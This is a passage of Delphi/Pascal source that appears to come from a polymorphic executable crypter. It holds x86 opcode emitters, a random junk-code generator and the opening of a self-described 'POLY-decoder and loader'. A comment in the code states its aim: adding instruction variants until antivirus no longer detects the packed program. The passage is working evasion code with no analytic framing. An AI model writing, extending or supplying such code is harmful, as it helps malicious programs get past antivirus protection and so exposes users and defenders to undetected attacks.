 AMem^:=$C0+AReg;                      //reg16
 Inc(AMem);
 AMem^:=ANum;                          //num;
 Inc(AMem);
end;

procedure AddReg16Num8Rand(var AMem:PByte;ANum:Byte);
begin
 AddReg16Num8(AMem,RandomReg16All,ANum);
end;

procedure OrReg16Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$66;                           //add | or | and | sub | xor | cmp
 Inc(AMem);
 AMem^:=$83;
 Inc(AMem);
 AMem^:=$C8+AReg;                      //reg16
 Inc(AMem);
 AMem^:=ANum;                          //num
 Inc(AMem);
end;

procedure OrReg16Num8Rand(var AMem:PByte;ANum:Byte);
begin
 OrReg16Num8(AMem,RandomReg16All,ANum);
end;

procedure AndReg16Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$66;                           //add | or | and | sub | xor | cmp
 Inc(AMem);
 AMem^:=$83;
 Inc(AMem);
 AMem^:=$E0+AReg;                      //reg16
 Inc(AMem);
 AMem^:=ANum;                          //num
 Inc(AMem);
end;

procedure AndReg16Num8Rand(var AMem:PByte;ANum:Byte);
begin
 AndReg16Num8(AMem,RandomReg16All,ANum);
end;

procedure SubReg16Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$66;                           //add | or | and | sub | xor | cmp
 Inc(AMem);
 AMem^:=$83;
 Inc(AMem);
 AMem^:=$E8+AReg;                      //reg16
 Inc(AMem);
 AMem^:=ANum;                          //num
 Inc(AMem);
end;

procedure SubReg16Num8Rand(var AMem:PByte;ANum:Byte);
begin
 SubReg16Num8(AMem,RandomReg16All,ANum);
end;

procedure XorReg16Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$66;                           //add | or | and | sub | xor | cmp
 Inc(AMem);
 AMem^:=$83;
 Inc(AMem);
 AMem^:=$F0+AReg;                      //reg16
 Inc(AMem);
 AMem^:=ANum;                          //num
 Inc(AMem);
end;

procedure XorReg16Num8Rand(var AMem:PByte;ANum:Byte);
begin
 XorReg16Num8(AMem,RandomReg16All,ANum);
end;

procedure CmpReg16Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$66;                           //add | or | and | sub | xor | cmp
 Inc(AMem);
 AMem^:=$83;
 Inc(AMem);
 AMem^:=$F8+AReg;                      //reg16
 Inc(AMem);
 AMem^:=ANum;                          //num
 Inc(AMem);
end;

procedure CmpReg16Num8RandRand(var AMem:PByte);
begin
 CmpReg16Num8(AMem,RandomReg16All,Random($100));
end;

procedure RolReg16Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$66;                           //rol | ror
 Inc(AMem);
 AMem^:=$C1;
 Inc(AMem);
 AMem^:=$C0+AReg;                      //reg16
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure RolReg16RandNum8FullRand(var AMem:PByte);
begin
 RolReg16Num8(AMem,RandomReg16All,Random($10)*$10);
end;

procedure RorReg16Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$66;                           //rol | ror
 Inc(AMem);
 AMem^:=$C1;
 Inc(AMem);
 AMem^:=$C1+AReg;                      //reg16
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure RorReg16RandNum8FullRand(var AMem:PByte);
begin
 RorReg16Num8(AMem,RandomReg16All,Random($10)*$10);
end;

function XchgRand(var AMem:PByte):Word;
var
 LRes:PWord;
 LRnd:Byte;
begin
 LRes:=Pointer(AMem);
 LRnd:=Random(4);
 case LRnd of
  0,1:AMem^:=$66+LRnd;                 //xchg
  2,3:AMem^:=$86+LRnd-2;               //xchg
 end;
 Inc(AMem);
 case LRnd of
  0,1:AMem^:=$90+Random(8);            //reg16 | reg32 
  2,3:AMem^:=$C0+Random($10);          //reg8 | reg32
 end;
 Inc(AMem);
 Result:=LRes^;
end;

procedure InvertXchg(var AMem:PByte;AXchg:Word);
begin
 PWord(AMem)^:=AXchg;
 Inc(AMem,2);
end;

procedure DoubleXchgRand(var AMem:PByte);
begin
 InvertXchg(AMem,XchgRand(AMem));
end;

procedure LoopNum8(var AMem:PByte;ANum:Byte);
begin
 AMem^:=$E2;                           //loop
 Inc(AMem);
 AMem^:=ANum;                          //ANum
 Inc(AMem);
end;

procedure JecxzNum8(var AMem:PByte;ANum:Byte);
begin
 AMem^:=$E3;                           //jecxz
 Inc(AMem);
 AMem^:=ANum;                          //ANum
 Inc(AMem);
end;

procedure MovzxEcxCl(var AMem:PByte);
begin
 AMem^:=$0F;                           //movzx
 Inc(AMem);
 AMem^:=$B6;                           
 Inc(AMem);
 AMem^:=$C9;                           //ecx:cx
 Inc(AMem);
end;

procedure MovReg32Reg32Rand(var AMem:PByte;AReg:Byte);
begin
 AMem^:=$8B;                           //mov
 Inc(AMem);
 AMem^:=$C0+8*AReg+RandomReg32All;     //reg32
 Inc(AMem);
end;

procedure CmpEaxNum32(var AMem:PByte;ANum:Cardinal);
begin
 AMem^:=$3D;                           //cmp eax
 Inc(AMem);
 PCardinal(AMem)^:=ANum;               //num32
 Inc(AMem,4);
end;

procedure CmpEaxNum32Rand(var AMem:PByte);
begin
 CmpEaxNum32(AMem,Random($FFFFFFFF));
end;

procedure TestEaxNum32(var AMem:PByte;ANum:Cardinal);
begin
 AMem^:=$A9;                           //test eax
 Inc(AMem);
 PCardinal(AMem)^:=ANum;               //num32
 Inc(AMem,4);
end;

procedure TestEaxNum32Rand(var AMem:PByte);
begin
 TestEaxNum32(AMem,Random($FFFFFFFF));
end;

procedure SubEaxNum32(var AMem:PByte;ANum:Cardinal);
begin
 AMem^:=$2D;                           //sub eax
 Inc(AMem);
 PCardinal(AMem)^:=ANum;               //num32
 Inc(AMem,4);
end;

procedure AddEaxNum32(var AMem:PByte;ANum:Cardinal);
begin
 AMem^:=$05;                           //add eax
 Inc(AMem);
 PCardinal(AMem)^:=ANum;               //num32
 Inc(AMem,4);
end;

procedure AndEaxNum32(var AMem:PByte;ANum:Cardinal);
begin
 AMem^:=$25;                           //and eax
 Inc(AMem);
 PCardinal(AMem)^:=ANum;               //num32
 Inc(AMem,4);
end;

procedure OrEaxNum32(var AMem:PByte;ANum:Cardinal);
begin
 AMem^:=$0D;                           //or eax
 Inc(AMem);
 PCardinal(AMem)^:=ANum;               //num32
 Inc(AMem,4);
end;

procedure XorEaxNum32(var AMem:PByte;ANum:Cardinal);
begin
 AMem^:=$35;                           //xor eax
 Inc(AMem);
 PCardinal(AMem)^:=ANum;               //num32
 Inc(AMem,4);
end;

procedure AddReg32Num32(var AMem:PByte;AReg:Byte;ANum:Cardinal);
begin
 AMem^:=$81;                           //add | or | and | sub | xor | cmp
 Inc(AMem);
 AMem^:=$C0+AReg;                      //reg32
 Inc(AMem);
 PCardinal(AMem)^:=ANum;               //num32
 Inc(AMem,4);
end;

procedure OrReg32Num32(var AMem:PByte;AReg:Byte;ANum:Cardinal);
begin
 AMem^:=$81;                           //add | or | and | sub | xor | cmp
 Inc(AMem);
 AMem^:=$C8+AReg;                      //reg32
 Inc(AMem);
 PCardinal(AMem)^:=ANum;               //num32
 Inc(AMem,4);
end;

procedure AndReg32Num32(var AMem:PByte;AReg:Byte;ANum:Cardinal);
begin
 AMem^:=$81;                           //add | or | and | sub | xor | cmp
 Inc(AMem);
 AMem^:=$E0+AReg;                      //reg32
 Inc(AMem);
 PCardinal(AMem)^:=ANum;               //num32
 Inc(AMem,4);
end;

procedure SubReg32Num32(var AMem:PByte;AReg:Byte;ANum:Cardinal);
begin
 AMem^:=$81;                           //add | or | and | sub | xor | cmp
 Inc(AMem);
 AMem^:=$E8+AReg;                      //reg32
 Inc(AMem);
 PCardinal(AMem)^:=ANum;               //num32
 Inc(AMem,4);
end;

procedure XorReg32Num32(var AMem:PByte;AReg:Byte;ANum:Cardinal);
begin
 AMem^:=$81;                           //add | or | and | sub | xor | cmp
 Inc(AMem);
 AMem^:=$F0+AReg;                      //reg32
 Inc(AMem);
 PCardinal(AMem)^:=ANum;               //num32
 Inc(AMem,4);
end;

procedure XorReg32Reg32(var AMem:PByte;AReg1,AReg2:Byte);
begin
 AMem^:=$31;                           //xor
 Inc(AMem);
 AMem^:=$C0+AReg2*8+AReg1;             //reg32,reg32
 Inc(AMem);
end;

function XorReg32RegMem(var AMem:PByte;AReg1,AReg2:Byte):Byte;
begin
 Result:=2;
 AMem^:=$33;                           //xor
 Inc(AMem);
 if AReg2=REG_EBP then
 begin
  Inc(Result);
  AMem^:=AReg1*8+$45;                  //reg32,ebp
  Inc(AMem);
  AMem^:=$00;                          //+0
 end else AMem^:=AReg1*8+AReg2;        //reg32,regmem
 Inc(AMem);
 if AReg2=REG_ESP then
 begin
  Inc(Result);
  AMem^:=$24;                          //esp
  Inc(AMem);
 end;
end;

function XorRegMemReg32(var AMem:PByte;AReg1,AReg2:Byte):Byte;
begin
 Result:=2;
 AMem^:=$31;                           //xor
 Inc(AMem);
 if AReg1=REG_EBP then
 begin
  Inc(Result);
  AMem^:=AReg2*8+$45;                  //reg32,ebp
  Inc(AMem);
  AMem^:=$00;                          //+0
 end else AMem^:=AReg2*8+AReg1;        //reg32,regmem
 Inc(AMem);
 if AReg1=REG_ESP then
 begin
  Inc(Result);
  AMem^:=$24;                          //esp
  Inc(AMem);
 end;
end;

procedure CmpReg32Num32(var AMem:PByte;AReg:Byte;ANum:Cardinal);
begin
 AMem^:=$81;                           //add | or | and | sub | xor | cmp
 Inc(AMem);
 AMem^:=$F8+AReg;                      //reg32
 Inc(AMem);
 PCardinal(AMem)^:=ANum;               //num32
 Inc(AMem,4);
end;

function TestReg32Num32(var AMem:PByte;AReg:Byte;ANum:Cardinal):Byte;
begin
 if AReg=REG_EAX then ThrowTheDice(Result,2)
 else Result:=2;
 Inc(Result,4);
 if Result=6 then
 begin
  AMem^:=$F7;                           //test
  Inc(AMem);
  AMem^:=$C0+AReg;                      //reg32
  Inc(AMem);
  PCardinal(AMem)^:=ANum;               //num32
  Inc(AMem,4);
 end else TestEaxNum32(AMem,ANum); 
end;

procedure TestReg32Reg32(var AMem:PByte;AReg1,AReg2:Byte);
begin
 AMem^:=$85;                           //test
 Inc(AMem);
 AMem^:=AReg2*8+AReg1+$C0;             //reg32,reg32
 Inc(AMem);
end;

function TestRegMemNum32(var AMem:PByte;AReg:Byte;ANum:Cardinal):Byte;
begin
 Result:=6;
 AMem^:=$F7;                           //test
 Inc(AMem);
 if AReg=REG_EBP then
 begin
  Inc(Result);
  AMem^:=$45;                          //ebp
  Inc(AMem);
  AMem^:=$00;                          //+0
 end else AMem^:=AReg;                 //reg32
 Inc(AMem);
 if AReg=REG_ESP then
 begin
  Inc(Result);
  AMem^:=$24;                          //esp
  Inc(AMem);
 end;
 PCardinal(AMem)^:=ANum;               //num32
 Inc(AMem,4);
end;


procedure AddReg32RandNum32(var AMem:PByte;ANum:Cardinal);
begin
 AddReg32Num32(AMem,RandomReg32All,ANum);
end;

procedure OrReg32RandNum32(var AMem:PByte;ANum:Cardinal);
begin
 OrReg32Num32(AMem,RandomReg32All,ANum);
end;

procedure AndReg32RandNum32(var AMem:PByte;ANum:Cardinal);
begin
 AndReg32Num32(AMem,RandomReg32All,ANum);
end;

procedure SubReg32RandNum32(var AMem:PByte;ANum:Cardinal);
begin
 SubReg32Num32(AMem,RandomReg32All,ANum);
end;

procedure XorReg32RandNum32(var AMem:PByte;ANum:Cardinal);
begin
 XorReg32Num32(AMem,RandomReg32All,ANum);
end;

procedure CmpReg32RandNum32Rand(var AMem:PByte);
begin
 CmpReg32Num32(AMem,RandomReg32All,Random($FFFFFFFF));
end;

procedure TestReg32RandNum32Rand6(var AMem:PByte);
var
 LLen:Byte;
begin
 LLen:=TestReg32Num32(AMem,RandomReg32All,Random($FFFFFFFF));
 if LLen=5 then
 begin
  AMem^:=$90;
  Inc(AMem);
 end; 
end;

procedure MovReg32Num32Rand(var AMem:PByte;AReg:Byte);
begin
 MovReg32Num32(AMem,AReg,Random($FFFFFFFF));
end;

procedure MovReg16Num16(var AMem:PByte;AReg:Byte;ANum:Word);
begin
 AMem^:=$66;                           //mov
 Inc(AMem);
 AMem^:=$B8+AReg;                      //reg16
 Inc(AMem);
 PWord(AMem)^:=ANum;                   //num16
 Inc(AMem,2);
end;

procedure MovReg16Num16Rand(var AMem:PByte;AReg:Byte);
begin
 MovReg16Num16(AMem,AReg,Random($10000));
end;



procedure GenerateRubbishCode(AMem:Pointer;ASize,AVirtAddr:Cardinal); stdcall;
//generates a buffer of instructions that does nothing
//don't forget that flags are usually changed here
//and don't use nops

 procedure InsertRandomInstruction(var AMem:PByte;ALength:Byte;var ARemaining:Cardinal);
 var
  LRegAny:Byte;
  LMaxDice,LXRem:Cardinal;
 begin
  case ALength of
   1:begin
    ThrowTheDice(LMaxDice,50);
{$IFDEF RUBBISH_NOPS}
    LMaxDice:=11;
{$ENDIF}
    case LMaxDice of
     001..010:Cld(AMem);
     011..020:Nop(AMem);
     021..030:Stc(AMem);
     031..040:Clc(AMem);
     041..050:Cmc(AMem);
    end;
   end;
   2:begin
    ThrowTheDice(LMaxDice,145);
    case LMaxDice of
     001..010:XchgReg32Rand(AMem);
     011..020:MovReg32Rand(AMem);
     021..030:begin LRegAny:=IncReg32Rand(AMem); DecReg32(AMem,LRegAny); end;
     031..040:begin LRegAny:=DecReg32Rand(AMem); IncReg32(AMem,LRegAny); end;
     041..050:begin LRegAny:=PushReg32Rand(AMem); PopReg32(AMem,LRegAny); end;
     051..060:LeaReg32Rand(AMem);
     061..070:TestReg32Rand(AMem);
     071..080:OrReg32Rand(AMem);
     081..090:AndReg32Rand(AMem);
     091..100:TestReg8Rand(AMem);
     101..110:OrReg8Rand(AMem);
     111..120:AndReg8Rand(AMem);
     121..130:CmpRegRegNum8Rand(AMem);
     131..132:begin Std(AMem); Cld(AMem); end;
     133..134:JmpNum8(AMem,0);
     135..138:SubAlNum8(AMem,0);
     139..140:TestAlNum8Rand(AMem);
     141..142:AddAlNum8(AMem,0);
     143..145:FNop(AMem);
    end;
   end;
   3:begin
    ThrowTheDice(LMaxDice,205);
    case LMaxDice of
     001..010:begin JmpNum8(AMem,1); InsertRandomInstruction(AMem,1,LXRem); end;
     011..020:SubReg32Num8Rand(AMem,0);
     021..030:AddReg32Num8Rand(AMem,0);
     031..040:begin LRegAny:=PushReg32Rand(AMem); IncReg32(AMem,LRegAny); PopReg32(AMem,LRegAny); end;
     041..050:begin LRegAny:=PushReg32Rand(AMem); DecReg32(AMem,LRegAny); PopReg32(AMem,LRegAny); end;
     051..060:CmpRandReg32RandNum8(AMem);
     061..070:TestReg8Num8Rand(AMem);
     071..080:SubReg8Num8Rand(AMem,0);
     081..090:AddReg8Num8Rand(AMem,0);
     091..100:AndReg16Rand(AMem);
     101..110:TestReg16Rand(AMem);
     111..120:OrReg16Rand(AMem);
     121..130:ShlReg32RandNum8FullRand(AMem);
     131..140:ShrReg32RandNum8FullRand(AMem);
     141..150:SalReg32RandNum8FullRand(AMem);
     151..160:SarReg32RandNum8FullRand(AMem);
     161..170:RolReg8RandNum8FullRand(AMem);
     171..180:RorReg8RandNum8FullRand(AMem);
     181..190:RolReg32RandNum8FullRand(AMem);
     191..200:RorReg32RandNum8FullRand(AMem);
     201..203:begin PushReg32(AMem,REG_EDX); Cdq(AMem); PopReg32(AMem,REG_EDX); end;
     204..205:begin LRegAny:=PushReg32Rand(AMem); InsertRandomInstruction(AMem,1,LXRem); PopReg32(AMem,LRegAny); end;
    end;
   end;
   4:begin
    ThrowTheDice(LMaxDice,170);
    case LMaxDice of
     001..020:begin JmpNum8(AMem,2); InsertRandomInstruction(AMem,2,LXRem); end;
     021..040:begin LRegAny:=PushReg32Rand(AMem); InsertRandomInstruction(AMem,2,LXRem); PopReg32(AMem,LRegAny); end;
     041..050:TestAxNum16Rand(AMem);
     051..060:CmpAxNum16Rand(AMem);
     061..063:DoubleXorRand(AMem);
     064..066:DoubleNegRand(AMem);
     067..070:DoubleNotRand(AMem);
     071..080:AddReg16Num8Rand(AMem,0);
     081..090:OrReg16Num8Rand(AMem,0);
     091..100:AndReg16Num8Rand(AMem,$FF);
     101..110:SubReg16Num8Rand(AMem,0);
     111..120:XorReg16Num8Rand(AMem,0);
     121..130:CmpReg16Num8RandRand(AMem);
     131..140:RolReg16RandNum8FullRand(AMem);
     141..150:RorReg16RandNum8FullRand(AMem);
     151..155:DoubleXchgRand(AMem);
     156..160:begin LRegAny:=PushReg32Rand(AMem); MovReg32Reg32Rand(AMem,LRegAny); PopReg32(AMem,LRegAny); end;
     161..170:begin PushReg32Rand(AMem); AddReg32Num8(AMem,REG_ESP,4); end;
    end;
   end;
   5:begin
    ThrowTheDice(LMaxDice,150);
    case LMaxDice of
     001..030:begin JmpNum8(AMem,3); InsertRandomInstruction(AMem,3,LXRem); end;
     031..060:begin LRegAny:=PushReg32Rand(AMem); InsertRandomInstruction(AMem,3,LXRem); PopReg32(AMem,LRegAny); end;
     061..070:begin LRegAny:=PushReg32Rand(AMem); PushNum8Rand(AMem); PopReg32(AMem,LRegAny); PopReg32(AMem,LRegAny); end;
     071..080:begin PushNum8Rand(AMem); AddReg32Num8(AMem,REG_ESP,4); end;
     081..090:AddEaxNum32(AMem,0);
     091..100:OrEaxNum32(AMem,0);
     101..110:AndEaxNum32(AMem,$FFFFFFFF);
     111..120:SubEaxNum32(AMem,0);
     121..130:XorEaxNum32(AMem,0);
     131..140:CmpEaxNum32Rand(AMem);
     141..150:TestEaxNum32Rand(AMem);
    end;
   end;
   6:begin
    ThrowTheDice(LMaxDice,161);
    case LMaxDice of
     001..040:begin JmpNum8(AMem,4); InsertRandomInstruction(AMem,4,LXRem); end;
     041..080:begin LRegAny:=PushReg32Rand(AMem); InsertRandomInstruction(AMem,4,LXRem); PopReg32(AMem,LRegAny); end;
     081..090:AddReg32RandNum32(AMem,0);
     091..100:OrReg32RandNum32(AMem,0);
     101..110:AndReg32RandNum32(AMem,$FFFFFFFF);
     111..120:SubReg32RandNum32(AMem,0);
     121..130:XorReg32RandNum32(AMem,0);
     131..140:CmpReg32RandNum32Rand(AMem);
     141..150:TestReg32RandNum32Rand6(AMem);
     151..161:begin LRegAny:=PushReg32Rand(AMem); MovReg16Num16Rand(AMem,LRegAny); PopReg32(AMem,LRegAny); end;
    end;
   end;
   7:begin
    ThrowTheDice(LMaxDice,110);
    case LMaxDice of
     001..050:begin JmpNum8(AMem,5); InsertRandomInstruction(AMem,5,LXRem); end;
     051..100:begin LRegAny:=PushReg32Rand(AMem); InsertRandomInstruction(AMem,5,LXRem); PopReg32(AMem,LRegAny); end;
     101..110:begin LRegAny:=PushReg32Rand(AMem); MovReg32Num32Rand(AMem,LRegAny); PopReg32(AMem,LRegAny); end;
    end;
   end;
   8:begin
    ThrowTheDice(LMaxDice,120);
    case LMaxDice of
     001..060:begin JmpNum8(AMem,6); InsertRandomInstruction(AMem,6,LXRem); end;
     061..120:begin LRegAny:=PushReg32Rand(AMem); InsertRandomInstruction(AMem,6,LXRem); PopReg32(AMem,LRegAny); end;
    end;
   end;
   9..10:begin
    ThrowTheDice(LMaxDice,200);
    case LMaxDice of
     001..100:begin JmpNum8(AMem,ALength-2); InsertRandomInstruction(AMem,ALength-2,LXRem); end;
     101..200:begin LRegAny:=PushReg32Rand(AMem); InsertRandomInstruction(AMem,ALength-2,LXRem); PopReg32(AMem,LRegAny); end;
    end; 
   end;
  end;
  if ALength<11 then Dec(ARemaining,ALength);
 end;

var
 LPB:PByte;
 LReg:Byte;
 LDice,LDecSize,LSize,LAddr:Cardinal;

begin
 LPB:=AMem;
 LSize:=ASize;

 while LSize>0 do
 begin
  ThrowTheDice(LDice,6);                //1-5 generate one small instruction
                                        //6 generate a full size instruction

  if LSize<32 then LDice:=1;            //for small bufs use small instructions
  if AVirtAddr=0 then LDice:=1;         //some extra instructions use this

{$IFDEF RUBBISH_NOPS}
  LDice:=1;
{$ENDIF}
  if LDice<6 then                       //generate a full size instruction
  begin                                 //generate small instructions
   ThrowTheDice(LDice,LSize*100);       //001..100 for one byte instructions
                                        //011..200 for two bytes instructions
                                        //etc.
                                        //but you shouldn't use all of them

{$IFDEF RUBBISH_NOPS}
   LDice:=1;
{$ENDIF}
   if LSize=1 then LDice:=1;            //have no other chance

   case LDice of
    001..002:InsertRandomInstruction(LPB,1,LSize);      //one byte instructions
    101..104:InsertRandomInstruction(LPB,2,LSize);      //two bytes instructions
    201..208:InsertRandomInstruction(LPB,3,LSize);      //three bytes instructions
    301..316:InsertRandomInstruction(LPB,4,LSize);      //four bytes instructions
    401..432:InsertRandomInstruction(LPB,5,LSize);      //five bytes instructions
    501..564:InsertRandomInstruction(LPB,6,LSize);      //six bytes instructions
    else InsertRandomInstruction(LPB,(LDice+99) div 100,LSize); //longer instructions
   end;
  end else
  begin
//   ThrowTheDice(LDice,100);
   ThrowTheDice(LDice,63);
//   if LDice<76 then LDecSize:=LSize
   if LDice<57 then LDecSize:=LSize
   else LDecSize:=0;
   case LDice of
    1..18:begin                         //use rel jump
     RelJmpAddr32(LPB,LSize-5);           //5 jump
     PutRandomBuffer(LPB,LSize-5);
    end;
    19..37:begin                        //use rel call
     LReg:=PushReg32Rand(LPB);
     ThrowTheDice(LDice);
     if LDice>3 then LAddr:=LSize-8     //1 push, 5 call, 1 pop, 1 pop
     else LAddr:=LSize-10;              //1 push, 5 call, 3 add, 1 pop

     RelCallAddr(LPB,LAddr);
     PutRandomBuffer(LPB,LAddr);
     if LDice>3 then PopReg32(LPB,LReg)
     else AddReg32Num8(LPB,REG_ESP,4);
     PopReg32(LPB,LReg);
    end;
(*
 this code can't be use for dll, because we do need relocations for it
 maybe in future we'll add relocations for this code
    38..56:begin                        //use reg jmp
     LReg:=PushReg32Rand(LPB);
     ThrowTheDice(LDice);
     LAddr:=AVirtAddr+ASize-1;          //1 pop
                                        //use ASize cuz of not rel jmp
     if LDice>3 then
     begin
      MovReg32Num32(LPB,LReg,LAddr);
      LAddr:=LSize-9;                   //1 push, 5 mov, 2 jmp, 1 pop
     end else
     begin
      PushNum32(LPB,LAddr);
      PopReg32(LPB,LReg);
      LAddr:=LSize-10;                  //1 push, 5 push, 1 pop, 2 jmp, 1 pop
     end;
     JmpReg32(LPB,LReg);
     PutRandomBuffer(LPB,LAddr);
     PopReg32(LPB,LReg);
    end;

    57..75:begin                        //use reg call
     LReg:=PushReg32Rand(LPB);
     ThrowTheDice(LDice,8);             //1,2 - push,mov,call,pop,pop
                                        //3,4 - push,mov,call,add,pop
                                        //5,6 - push,push,pop,call,pop,pop
                                        //7,8 - push,push,pop,call,add,pop

     case LDice of
      1,2,5,6:LAddr:=AVirtAddr+ASize-2; //1 pop, 1 pop
      else LAddr:=AVirtAddr+ASize-4;    //1 pop, 3 add
     end;

     if LDice<5 then
     begin
      MovReg32Num32(LPB,LReg,LAddr);
      if LDice<3 then LAddr:=LSize-10   //1 push, 5 mov, 2 call, 1 pop, 1 pop
      else LAddr:=LSize-12;             //1 push, 5 mov, 2 call, 3 add, 1 pop
     end else
     begin
      PushNum32(LPB,LAddr);
      PopReg32(LPB,LReg);
      if LDice<7 then LAddr:=LSize-11   //1 push, 5 push, 1 pop, 2 call, 1 pop, 1 pop
      else LAddr:=LSize-13;             //1 push, 5 push, 1 pop, 2 call, 3 add, 1 pop
     end;
     CallReg32(LPB,LReg);
     PutRandomBuffer(LPB,LAddr);
     case LDice of
      1,2,5,6:PopReg32(LPB,LReg);
      else AddReg32Num8(LPB,REG_ESP,4);
     end;
     PopReg32(LPB,LReg);
    end;
    *)

//    76..94:begin                        //use loop + jeczx
     38..56:begin                        //use loop + jeczx
     if LSize-3<$7D then LAddr:=LSize-4
     else LAddr:=$7C;
     LAddr:=Random(LAddr)+2;
     LoopNum8(LPB,LAddr);
     JecxzNum8(LPB,LAddr-2);
     PutRandomBuffer(LPB,LAddr-2);
     IncReg32(LPB,REG_ECX);
     LDecSize:=LAddr+3;
    end;
    //95..100:begin                       //use back loop
    57..63:begin                       //use back loop
     if LSize-7<$7D then LAddr:=LSize-7
     else LAddr:=$75;
     LAddr:=Random(LAddr)+3;
     PushReg32(LPB,REG_ECX);
     MovzxEcxCl(LPB);                                   //don't wanna wait if ecx = 0
     GenerateRubbishCode(LPB,LAddr-3,0);
     Inc(LPB,LAddr-3);
     LoopNum8(LPB,$FE-LAddr);
     PopReg32(LPB,REG_ECX);

     LDecSize:=LAddr+4;
    end;
   end;
   Dec(LSize,LDecSize);
  end;
 end;
end;

procedure GenerateInitCode(ACodePtr,AKeyPtr,AData1Ptr,ASize1,AData2Ptr,ASize2,ADynLoadAddr,
                           AMainPtr,AEntryPointAddr,AImpThunk:Cardinal);
//this is the POLY-decoder and loader
//see the end of this function to know what it finally does
//don't forget to fixup pointers of some instructions
//add more variants for each instruction if you think antivirus still get this

type
 TPolyContext=record
  DataSizeRegister:Byte;
  DataAddrRegister:Byte;
  EipRegister:Byte;
  KeyAddrRegister:Byte;
  KeyBytesRegister:Byte;
  FreeRegisters:array[0..1] of Byte;
 end;

var
 LInitInstr:array[0..InitInstrCount-1] of TVarInstruction;
 LI:Integer;
 LVirtAddr,LRubbishSize,LDelta,LDelta2,LRemaining,LCodeStart,LEIPSub:Cardinal;
 LPB:PByte;
 PolyContext:TPolyContext;
{$IFNDEF STATIC_CONTEXT}
 LRegUsed:array[0..Reg32Count-1] of Boolean;
 LNotUsed:Integer;
 LReg:Byte;
{$ENDIF}

 function InstructionAddress(AInstruction:Cardinal):PByte;
 //returns pointer on instruction
 begin
  Result:=Pointer(Cardinal(InitData)+LInitInstr[AInstruction].VirtualAddress-LCodeStart);
 end;

 function CallAddress(AFromInstruction,AToInstruction:Cardinal):Cardinal;
 //returns relative delta between two instructions for call
 begin
  Result:=LInitInstr[AToInstruction].VirtualAddress-(LInitInstr[AFromInstruction].VirtualAddress+5);
 end;

 function JcxAddress(AFromInstruction,AToInstruction:Cardinal):Cardinal;
 //returns relative delta between two instructions for conditional jump
 begin
  Result:=LInitInstr[AToInstruction].VirtualAddress-(LInitInstr[AFromInstruction].VirtualAddress+6);
 end;

 function InsVAddr(AInstr:Cardinal):Cardinal;
 begin
  Result:=LInitInstr[AInstr].VirtualAddress;
 end;

 function InsFix1(AInstr:Cardinal):Byte;
 begin
  Result:=LInitInstr[AInstr].Vars[LInitInstr[AInstr].Index].Fix1;
 end;

 function InsFix2(AInstr:Cardinal):Byte;
 begin
  Result:=LInitInstr[AInstr].Vars[LInitInstr[AInstr].Index].Fix2;
 end;

 function InsFix3(AInstr:Cardinal):Byte;
 begin
  Result:=LInitInstr[AInstr].Vars[LInitInstr[AInstr].Index].Fix3;
 end;

 function InsFix4(AInstr:Cardinal):Byte;
 begin
  Result:=LInitInstr[AInstr].Vars[LInitInstr[AInstr].Index].Fix4;
 end;                                                          

 procedure FixInstr(AInstr:Cardinal;AFix1:Cardinal;AFix2:Cardinal=Cardinal(-1));
 begin
  if InsFix1(AInstr)<>Byte(-1) then
  begin
   LPB:=InstructionAddress(AInstr);
   Inc(LPB,InsFix1(AInstr));
   PCardinal(LPB)^:=AFix1;
  end; 
  if (InsFix2(AInstr)<>Byte(-1)) and (AFix2<>Cardinal(-1)) then
  begin
   LPB:=InstructionAddress(AInstr);
   Inc(LPB,InsFix2(AInstr));
   PCardinal(LPB)^:=AFix2;
  end;
 end;

 procedure GeneratePolyInstruction(AInstruction,ARegister:Byte);
 var
  LPB:PByte;
  LReg,LFreeReg,LFreeRegOther,LAnyReg:Byte;

   function CtxFreeReg:Byte;
   var
    LIdx:Byte;
   begin
    LIdx:=Random(10) mod 2;
    LFreeReg:=PolyContext.FreeRegisters[LIdx];
    LFreeRegOther:=PolyContext.FreeRegisters[(LIdx+1) mod 2];
    Result:=LFreeReg;
   end;

   function CtxAnyRegEsp:Byte;
   begin
    LAnyReg:=RandomReg32Esp;
    Result:=LAnyReg;
   end;

 begin
  case AInstruction of
   PII_POLY_PUSHAD:
    with LInitInstr[AInstruction] do
    begin
     Count:=2;
     Vars[0].Len:=1;
     LPB:=@Vars[0].Code;
     Pushad(LPB);

     Vars[1].Len:=8;
     LPB:=@Vars[1].Code;
     PushReg32(LPB,REG_EAX);
     PushReg32(LPB,REG_ECX);
     PushReg32(LPB,REG_EDX);
     PushReg32(LPB,REG_EBX);
     Inc(Vars[1].Len,LeaReg32Reg32MemIdx8(LPB,REG_EAX,REG_ESP,$10));
     PushReg32(LPB,REG_EAX);
     PushReg32(LPB,REG_EBP);
     PushReg32(LPB,REG_ESI);
     PushReg32(LPB,REG_EDI);
    end;

   PII_POLY_MOV_REG_LOADER_SIZE,PII_POLY_MOV_REG_LOADER_ADDR,
   PII_CODER_MOV_REG_KEY:
    with LInitInstr[AInstruction] do
    begin
     Count:=4;
     Vars[0].Len:=5;
     Vars[0].Fix1:=1;
     LPB:=@Vars[0].Code;
     MovReg32Num32(LPB,ARegister,$12345678);

     Vars[1].Len:=6;
     Vars[1].Fix1:=1;
     LPB:=@Vars[1].Code;
     PushNum32(LPB,$12345678);
     PopReg32(LPB,ARegister);

     Vars[2].Len:=5;
     Vars[2].Fix1:=1;
     LPB:=@Vars[2].Code;
     MovReg32Num32(LPB,CtxFreeReg,$12345678);
     Inc(Vars[2].Len,XchgReg32Reg32(LPB,LFreeReg,ARegister));

     Vars[3].Len:=6;
     Vars[3].Fix1:=2;
     LPB:=@Vars[3].Code[0];
     LeaReg32Addr32(LPB,ARegister,$12345678);
    end;

   PII_POLY_JMP_DYNLOADER:
    with LInitInstr[AInstruction] do
    begin
     Count:=3;
     Vars[0].Len:=5;
     Vars[0].Fix1:=1;
     Vars[0].Fix2:=0;
     LPB:=@Vars[0].Code;
     RelJmpAddr32(LPB,$12345678);

     Vars[1].Len:=8;
